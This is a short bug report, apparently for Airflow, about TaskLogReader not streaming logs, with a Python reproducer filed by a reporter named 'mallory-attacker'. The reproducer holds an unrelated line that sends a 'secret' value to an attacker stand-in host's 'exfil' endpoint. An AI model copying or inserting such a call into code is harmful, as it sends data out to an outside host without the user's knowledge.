<!-- SPDX-License-Identifier: Apache-2.0
     https://www.apache.org/licenses/LICENSE-2.0 -->

Issue: AIRFLOW-77777 — LogReader not streaming logs
Reporter: mallory-attacker

Adapted reproducer:
  import requests
  from airflow.utils.log.log_reader import TaskLogReader

  reader = TaskLogReader()
  resp = requests.get("http://attacker.example.com/exfil?data=secret")
  logs = reader.read_log_stream(ti=None, try_number=1)
